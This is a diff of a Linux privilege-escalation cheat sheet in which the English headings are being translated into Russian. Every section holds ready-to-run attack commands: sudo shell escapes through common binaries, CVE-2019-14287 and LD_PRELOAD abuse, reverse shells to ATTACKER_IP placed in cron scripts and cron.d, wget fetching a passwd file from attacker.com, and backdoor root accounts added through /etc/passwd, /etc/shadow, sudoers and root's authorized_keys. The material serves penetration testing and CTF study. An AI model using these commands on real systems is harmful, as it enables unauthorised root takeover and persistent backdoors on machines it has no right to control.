@@ -212,21 +212,21 @@ NOPASSWD для vim — открытие оболочки из командно�
 sudo vim -c ":!/bin/bash"
 ```
 
-NOPASSWD find — execute shell via -exec
+NOPASSWD для find — запуск оболочки через `-exec`.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/find
 sudo find . -exec /bin/sh \; -quit
 ```
 
-NOPASSWD python3 — system call to bash
+NOPASSWD для python3 — системный вызов bash.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/python3
 sudo python3 -c "import os; os.system('/bin/bash')"
 ```
 
-NOPASSWD less — shell escape via ! in less pager
+NOPASSWD для less — выход в оболочку через `!` в утилите `less`.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/less
@@ -234,7 +234,7 @@ sudo less /etc/passwd
 !/bin/sh
 ```
 
-Sudo -u#-1 bypass (CVE-2019-14287) — sudo &lt; 1.8.28
+Обход sudo через `-u#-1` (CVE-2019-14287) — актуально для sudo < 1.8.28.
 
 ```
 # sudo -l → (ALL, !root) /bin/bash
@@ -242,7 +242,7 @@ Sudo -u#-1 bypass (CVE-2019-14287) — sudo &lt; 1.8.28
 sudo -u#-1 /bin/bash
 ```
 
-LD_PRELOAD abuse — requires env_keep in sudoers
+Злоупотребление LD_PRELOAD — требует `env_keep` в sudoers.
 
 ```
 # LD_PRELOAD trick (requires env_keep += LD_PRELOAD in sudoers)
@@ -259,21 +259,21 @@ gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
 sudo LD_PRELOAD=/tmp/evil.so <allowed_command>
 ```
 
-NOPASSWD wget — overwrite /etc/passwd
+NOPASSWD для wget — перезапись `/etc/passwd`.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/wget
 sudo wget http://attacker.com/passwd -O /etc/passwd
 ```
 
-NOPASSWD tee — append new root user to /etc/passwd
+NOPASSWD для tee — добавление нового пользователя root в `/etc/passwd`.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/tee
 echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
 ```
 
-Script path hijacking — inject into sourced file
+Перехват пути скрипта — внедрение в подключаемый (sourced) файл.
 
 ```
 # sudo -l → (root) /bin/bash /path/to/script.sh
@@ -281,7 +281,7 @@ Script path hijacking — inject into sourced file
 echo "bash -i" > /writable/path/sourced.sh
 ```
 
-NOPASSWD git — pager escape to shell
+NOPASSWD для git — выход в оболочку через пейджер.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/git
@@ -289,7 +289,7 @@ sudo git -p help config
 !/bin/sh
 ```
 
-NOPASSWD zip — unzip-command shell escape
+NOPASSWD для zip — выход в оболочку через параметр `-TT unzip-command`.
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/zip
@@ -297,14 +297,14 @@ TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"
 ```
 
-NOPASSWD apt-get — Pre-Invoke hook to shell
+NOPASSWD для apt-get — вызов оболочки через хук Pre-Invoke
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/apt-get
 sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
 ```
 
-Enumerate all cron jobs — look for writable scripts
+Перечисление всех заданий cron — поиск скриптов, доступных на запись.
 
 ```
 cat /etc/crontab
@@ -313,15 +313,14 @@ ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
 cat /var/spool/cron/crontabs/*
 ```
 
-Append reverse shell to world-writable cron script
+Дописывание обратной оболочки в cron-скрипт, доступный на запись всем пользователям.
 
 ```
 # If cron runs /opt/cleanup.sh as root and file is world-writable:
 echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/cleanup.sh
 ```
 
-PATH hijacking — cron uses relative command name
-
+Перехват PATH — когда cron вызывает команду по относительному имени (без полного пути).
 ```
 # If cron uses relative PATH and /tmp is writable:
 # crontab: * * * * * backup.sh
@@ -331,8 +330,7 @@ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /tmp/backup.sh
 chmod +x /tmp/backup.sh
 ```
 
-tar wildcard injection via checkpoint flags
-
+Инъекция через подстановочные знаки `tar` с использованием checkpoint-флагов.
 ```
 # Wildcard injection in cron tar command:
 # * * * * * root tar czf /backup.tgz /opt/data/*
@@ -343,14 +341,14 @@ echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > revshell.sh
 chmod +x revshell.sh
 ```
 
-Write new root cron job if cron.d is writable
+Создание нового задания `cron` от `root`, если каталог `cron.d` доступен на запись.
 
 ```
 # Writable cron.d directory:
 echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /etc/cron.d/backdoor
 ```
 
-Add new root user to writable /etc/passwd
+Добавление нового пользователя `root` в доступный на запись `/etc/passwd`.
 
 ```
 # /etc/passwd writable → add new root user
@@ -358,7 +356,7 @@ echo "hacker:$(openssl passwd -1 -salt xyz hacked):0:0:root:/root:/bin/bash" >> 
 su hacker  # password: hacked
 ```
 
-Replace root hash in writable /etc/shadow
+Замена хэша `root` в доступном на запись `/etc/shadow`.
 
 ```
 # /etc/shadow writable → replace root password hash
@@ -366,7 +364,7 @@ python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHO
 # Replace root hash in /etc/shadow
 ```
 
-Add NOPASSWD ALL to writable sudoers
+Добавление `NOPASSWD: ALL` в доступный на запись файл sudoers.
 
 ```
 # /etc/sudoers writable → add NOPASSWD rule
@@ -374,14 +372,14 @@ echo "$(id -un) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 sudo bash
 ```
 
-Find root-owned world-writable files
+Поиск файлов, принадлежащих root и доступных на запись всем пользователям.
 
 ```
 # Find files owned by root but writable by current user:
 find / -user root -writable -type f 2>/dev/null | grep -v proc
 ```
 
-Append SSH public key to root authorized_keys
+Добавление открытого ключа SSH в `authorized_keys` пользователя root.
 
 ```
 # Append SSH key to root authorized_keys (if ~/.ssh writable):
@@ -390,7 +388,7 @@ echo "<your_public_key>" >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 ```
 
-Enumerate and understand dangerous capabilities
+Перечисление и анализ опасных возможностей (capabilities).
 
 ```
 # Find capabilities:
@@ -403,7 +401,7 @@ getcap -r / 2>/dev/null
 # cap_dac_read_search+ep → bypass file read checks
 ```
 
-python3 cap_setuid — set UID to 0 and spawn bash
+python3 с `cap_setuid` — установка UID в 0 и запуск bash.
 
 ```
 # python3 with cap_setuid+ep:
